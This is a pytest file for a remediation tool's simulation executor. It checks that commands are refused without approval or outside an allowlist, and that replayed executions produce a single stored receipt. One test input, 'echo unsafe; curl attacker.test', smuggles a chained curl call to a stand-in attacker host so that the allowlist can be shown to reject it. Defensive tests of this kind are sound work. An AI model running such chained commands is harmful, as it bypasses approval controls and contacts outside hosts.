import sqlite3

import pytest

from app.tools.remediation import ACTIONS, SimulationExecutor


def test_executor_enforces_approval_and_allowlist():
    connection = sqlite3.connect(":memory:")
    executor = SimulationExecutor(connection)
    action = ACTIONS["gateway_remediate"]
    with pytest.raises(PermissionError):
        executor.execute("thread", [action.command], approved=False)
    with pytest.raises(ValueError):
        executor.execute("thread", ["echo unsafe; curl attacker.test"], approved=True)
    assert connection.execute("SELECT count(*) FROM execution_receipts").fetchone()[0] == 0
    connection.close()


def test_execution_replay_returns_same_receipt_once(tmp_path):
    database = tmp_path / "receipts.sqlite"
    action = ACTIONS["gateway_remediate"]
    first_connection = sqlite3.connect(database)
    first = SimulationExecutor(first_connection).execute("thread", [action.command], approved=True)
    first_connection.close()
    second_connection = sqlite3.connect(database)
    second = SimulationExecutor(second_connection).execute("thread", [action.command], approved=True)
    assert first == second
    assert second_connection.execute("SELECT count(*) FROM execution_receipts").fetchone()[0] == 1
    assert second[0]["mode"] == "simulation"
    second_connection.close()
